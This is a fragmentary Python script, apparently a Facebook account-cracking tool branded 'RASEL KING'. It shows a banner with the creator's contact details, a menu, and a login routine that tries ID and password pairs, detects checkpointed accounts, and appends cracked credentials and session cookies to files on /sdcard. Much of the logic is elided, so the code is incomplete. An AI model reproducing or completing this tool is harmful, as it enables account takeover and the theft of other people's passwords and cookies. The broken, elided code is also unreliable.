...
from os import system as Love_RASELKING
...
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}shati{M}={H}abir{M}={H}tisha{M}={H}RASEL KING{M}={H}samim{P}]'
...
{M}┃{k} 𝗖𝗥𝗘𝗔𝗧𝗢𝗥  {H}• {m}𝐑𝐀𝐒𝐄𝐋 𝐊𝐈𝐍𝐆{M}                                                 ┃
{M}┃{k} 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 {H}• {m}𝐑𝐀𝐒𝐄𝐋 𝐊𝐈𝐍𝐆{M}                                               ┃                    
{M}┃{k} 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 {H}• {m}01602331251{M}                                                  ┃
{M}┃{k} 𝗧𝗢𝗢𝗟𝗦    {H}• {m}𝐏𝐀𝐈𝐃{M}                                                                    ┃ 
{M}┃{k} 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  {H}• {m}1.0{M}                                                                       ┃
{M}┃{k} 𝗚𝗜𝗧𝗛𝗨??   {H}• {m}RASEL-KING{M}                                                    ┃
{M}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def mainx():
    ...
    if KING in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/rasel1861?mibextid=ZbWKwL");mainx()
...
def x8():
  ...
  clear();print(logo);print(f"{dot}{P}Number  {BLUE}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]')
...
def f1(idf,pwv):
  global loop,ok,cp
  animasi = random.choice(["\x1b[1;91mRASEL KING","\x1b[1;92mRASEL KING","\x1b[1;93mRASEL KING","\x1b[1;94mRASEL KING","\x1b[1;95mRASEL KING","\x1b[1;96mRASEL KING","\x1b[1;97mRASEL KING","\x1b[1;91mRASEL KING","\x1b[1;92mRASEL KING","\x1b[1;93mRASEL KING","\x1b[1;94mRASEL KING","\x1b[1;95mRASEL KING","\x1b[1;96mRASEL KING"])
    ...
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
        	...
        	print(f"\r\r\033[38;5;46m ┗━[𝙋𝘼𝙎??𝙒𝙊𝙍𝘿] : {ps} ")
        open(' /sdcard/RASEL#FF00A8KING.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
        ...
        print(f"\r\r\033[38;5;46m ┣━[𝙐𝙄𝘿] : {uid} ")
        print(f"\r\r\033[38;5;46m ┣━[𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿] : {ps} ")
        if 'y' in cokix:
        	print(f"\r\r\033[38;5;46m ┗━[COOKIES] : {cookie} ")
        open(' /sdcard/RASEL-KING.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
...
if __name__=='__main__':
  try:os.mkdir('RASEL KING-Cyber')
  except:pass
  try:os.mkdir('Khorsed-RASEL KING')
  except:pass
#  b2()
#  mainx() 
  mainx()
